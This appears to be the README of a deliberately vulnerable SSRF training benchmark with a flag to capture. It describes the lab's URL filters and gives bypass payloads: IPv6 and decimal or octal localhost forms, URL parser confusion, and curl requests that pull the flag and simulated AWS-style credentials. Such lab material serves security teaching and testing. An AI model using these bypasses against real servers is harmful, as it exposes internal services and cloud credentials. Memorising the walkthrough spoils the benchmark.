# S7BEN-HARD-003: SSRF with URL Filtering Bypass

**Category:** A10:2021 - Server-Side Request Forgery (SSRF)
**Difficulty:** Medium
**Points:** 160

## Overview

This benchmark challenges you to bypass URL filtering mechanisms to achieve Server-Side Request Forgery (SSRF) and access internal services. The application implements multiple security filters, but they can be bypassed using various techniques.

**Learning Focus:**
- SSRF attack vectors and exploitation
- DNS rebinding techniques
- IP address encoding bypasses
- URL parser confusion attacks
- Cloud metadata service access

## Quick Start

```bash
make up      # Build and start services
make test    # Run health checks
make exploit # Run automated exploitation (optional)
make down    # Stop and cleanup
```

## Architecture

**3 Containers:**
- **web-app** (port 5000) - Vulnerable URL fetcher
- **internal-api** (port 8080, internal) - Target service with flag
- **metadata-service** (port 8000, internal) - Simulated cloud metadata

## Target

- **URL:** http://localhost:5000
- **Telemetry:** http://localhost:5000/api/telemetry
- **Debug:** http://localhost:5000/debug/filters
- **Flag Format:** `S7BEN{...}`

## Security Filters

The application implements the following URL filters:

### 1. Scheme Validation
- Only `http` and `https` allowed
- Blocks `file://`, `gopher://`, `dict://`, etc.

### 2. Hostname Blacklist
- Blocks: `127.0.0.1`, `localhost`, `0.0.0.0`
- Case-insensitive matching

### 3. Private IP Range Blocking
- Blocks IPs starting with: `10.`, `172.16.`, `192.168.`, `169.254.`
- Based on DNS resolution of hostname

### 4. DNS Resolution Check
- Resolves hostname before checking
- **Vulnerable to:** DNS rebinding attacks

## Filter Bypass Techniques

### Direct Container Hostname
The most straightforward bypass - Docker container names resolve within the network:
```bash
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-api:8080/flag"}'
```

### IPv6 Localhost
IPv6 addresses are not properly filtered:
```
http://[::1]:8080/flag
http://[0:0:0:0:0:0:0:1]:8080/flag
```

### Decimal IP Notation
Convert IP to decimal format (127.0.0.1 = 2130706433):
```
http://2130706433:8080/flag
```

### Octal IP Notation
Use octal representation:
```
http://0177.0.0.1:8080/flag
```

### URL Parser Confusion
Exploit URL parsing differences:
```
http://attacker.com@internal-api:8080/flag
http://internal-api:8080@example.com/flag
```

## Hints

1. Check `/debug/filters` to see the filter configuration
2. The filters only check the initial DNS resolution
3. Docker container names are valid hostnames within the network
4. IPv6 addresses bypass the IPv4 checks
5. Internal services run on different ports (8080, 8000)
6. The metadata service simulates AWS EC2 metadata endpoint

## Exploitation Path

1. **Recon:** Test with public URL to verify functionality
2. **Filter Discovery:** Visit `/debug/filters` to understand blocks
3. **Bypass Testing:** Try different localhost representations
4. **Internal Access:** Use container hostnames directly
5. **Flag Retrieval:** Access `/flag` endpoint on internal-api
6. **Bonus:** Enumerate metadata service for credentials

## Sample Payloads

```bash
# Test filter blocking
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8080/flag"}'
# Expected: Blocked

# Bypass using container hostname
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://internal-api:8080/flag"}'
# Expected: Flag revealed

# Access metadata service
curl -X POST http://localhost:5000/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata-service:8000/credentials"}'
# Expected: AWS-like credentials
```

## Telemetry

Monitor your exploitation progress:

```bash
curl http://localhost:5000/api/telemetry
```

Returns:
```json
{
  "benchmark_id": "S7BEN-HARD-003",
  "request_count": 12,
  "ssrf_attempts": 8,
  "filter_blocks": 3,
  "internal_access_count": 2,
  "accessed_urls": ["http://internal-api:8080/flag"],
  "uptime_seconds": 145
}
```

## Reset Benchmark

```bash
make reset
# or
curl -X POST http://localhost:5000/reset
```

## Real-World Context

**Capital One Breach (2019):**
An attacker exploited an SSRF vulnerability in a web application firewall to access AWS EC2 instance metadata, ultimately compromising over 100 million customer records. The attack leveraged SSRF to retrieve IAM credentials from the metadata service.

**Impact:**
- $80 million fine from regulators
- $100+ million in customer notifications and remediation
- Demonstrates critical importance of SSRF prevention

## Learning Objectives

After completing this benchmark, you should understand:
- How SSRF vulnerabilities work
- Common filter bypass techniques
- The danger of cloud metadata services
- Why allowlist-based filtering is superior to blocklists
- The importance of network segmentation
- How Docker networking can be exploited

## Files

```
S7BEN-HARD-003/
├── app/
│   ├── Dockerfile
│   ├── requirements.txt
│   ├── app.py
│   └── templates/
│       └── index.html
├── internal/
│   ├── Dockerfile
│   ├── requirements.txt
│   └── api.py
├── metadata/
│   ├── Dockerfile
│   ├── requirements.txt
│   └── server.py
├── docker-compose.yml
├── Makefile
├── benchmark.yaml
├── README.md (this file)
├── TESTING.md
└── exploit.py
```

## Troubleshooting

**Services not starting?**
```bash
docker compose logs -f
```

**Can't access internal services?**
Make sure you're using the SSRF endpoint (`/fetch`), not accessing directly.

**Filter blocking everything?**
Check `/debug/filters` for hints about bypass techniques.

**Want more details?**
See `TESTING.md` for comprehensive exploitation guide.

## Warning

⚠️ **This benchmark contains intentional security vulnerabilities.**
Do not deploy in production environments. Use only in isolated testing environments.

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PortSwigger SSRF Guide](https://portswigger.net/web-security/ssrf)
- [AWS EC2 Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
